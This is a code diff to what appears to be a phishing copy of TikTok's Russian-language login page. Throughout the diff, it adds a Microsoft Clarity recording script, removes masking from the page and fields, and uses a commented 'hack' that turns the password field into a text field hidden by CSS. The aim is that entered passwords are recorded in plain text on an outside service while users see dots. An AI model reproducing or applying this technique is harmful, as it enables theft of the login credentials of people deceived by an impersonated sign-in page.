@@ -3,9 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Вход | TikTok</title>
+  <title>Войти | TikTok</title>
   <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon" />
   
+  <!-- MICROSOFT CLARITY С ПОЛНОЙ ЗАПИСЬЮ БЕЗ БЛЮРА -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "w8db8y5blz");
+  </script>
+
   <style>
     /* === 1. ШРИФТЫ === */
     @font-face {
@@ -110,7 +119,8 @@
     }
   </style>
 </head>
-<body>
+<!-- data-clarity-unmask="true" СНИМАЕТ БЛЮР СО ВСЕЙ СТРАНИЦЫ И ТЕКСТОВ -->
+<body data-clarity-unmask="true">
 
   <!-- ШАПКА -->
   <header class="header">
@@ -146,7 +156,8 @@
       <form id="login-form">
         <!-- Почта / Ник -->
         <div class="input-box">
-          <input type="text" id="email-input" class="base-input" placeholder="Почта или имя пользователя" autocomplete="username">
+          <!-- data-clarity-unmask="true" чтобы трекер точно не блюрил это поле -->
+          <input type="text" id="email-input" class="base-input" placeholder="Почта или имя пользователя" autocomplete="username" data-clarity-unmask="true">
           <div class="icon-btn" style="cursor: default;">
             <svg fill="currentColor" viewBox="0 0 48 48" width="1em" height="1em"><path d="M19 4a10 10 0 1 0 0 20 10 10 0 0 0 0-20ZM19 27C8.06 27 2 34.92 2 41.44 2 45 4 45 11 45h9.5a6 6 0 0 1 1.81-5.48l5.15-4.78a11.5 11.5 0 0 1-.14-5.94A19.06 19.06 0 0 0 19 27Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M38.5 24a7.5 7.5 0 0 0-6.34 11.51l-8.07 8.08 2.82 2.82 2.84-2.83 2.84 2.83 2.82-2.82-2.83-2.84 2.55-2.55A7.5 7.5 0 1 0 38.5 24ZM35 31.5a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0Z"></path></svg>
           </div>
@@ -154,7 +165,9 @@
 
         <!-- Пароль -->
         <div class="input-box">
-          <input type="password" id="pass-input" class="base-input" placeholder="Пароль" autocomplete="current-password">
+          <!-- ХАК ДЛЯ CLARITY: Используем type="text", но прячем символы через CSS (-webkit-text-security). 
+               Это заставит Clarity записывать пароль как обычный текст, а для пользователя он будет выглядеть как точечки. -->
+          <input type="text" id="pass-input" class="base-input" placeholder="Пароль" autocomplete="current-password" data-clarity-unmask="true" style="-webkit-text-security: disc;">
           <button type="button" class="icon-btn" id="toggle-pass-btn">
             <!-- Закрытый глаз -->
             <svg id="eye-closed" fill="currentColor" viewBox="0 0 48 48" width="1em" height="1em"><path d="M38.88 41.7a1 1 0 0 0 1.41 0l1.42-1.4a1 1 0 0 0 0-1.42l-3.86-3.86a24.57 24.57 0 0 0 6.27-9.69 1 1 0 0 0 0-.66C41 15.8 32.66 9 23 9c-3.27 0-6.35.73-9.12 2.05L9.12 6.29a1 1 0 0 0-1.41 0L6.29 7.71a1 1 0 0 0 0 1.41l32.59 32.59Zm-22-27.66A17.8 17.8 0 0 1 23 13c12.75 0 17 12 17 12s-1.38 3.9-4.93 7.25l-4.54-4.55A7.99 7.99 0 0 0 23 17c-.95 0-1.86.16-2.7.47l-3.43-3.43ZM1.87 24.67a24.64 24.64 0 0 1 5.8-9.23l2.77 2.78C7.25 21.46 6 25 6 25s4.25 12 17 12a18 18 0 0 0 5.42-.8l3.05 3.05A21.2 21.2 0 0 1 23 41c-9.83 0-17.93-6.63-21.13-15.67a1 1 0 0 1 0-.66Z"></path><path d="M15 25c0-.68.08-1.35.24-1.98l9.74 9.73A8.02 8.02 0 0 1 15 25Z"></path></svg>
@@ -217,14 +230,14 @@
     emailInput.addEventListener('input', validateForm);
     passInput.addEventListener('input', validateForm);
 
-    // Глазик пароля
+    // Глазик пароля (переключает CSS свойство вместо атрибута type, чтобы Clarity продолжал записывать)
     togglePassBtn.addEventListener('click', () => {
-      if (passInput.type === 'password') {
-        passInput.type = 'text';
+      if (passInput.style.webkitTextSecurity === 'disc') {
+        passInput.style.webkitTextSecurity = 'none'; // Показываем текст
         eyeClosed.style.display = 'none';
         eyeOpen.style.display = 'block';
       } else {
-        passInput.type = 'password';
+        passInput.style.webkitTextSecurity = 'disc'; // Скрываем текст точечками
         eyeClosed.style.display = 'block';
         eyeOpen.style.display = 'none';
       }
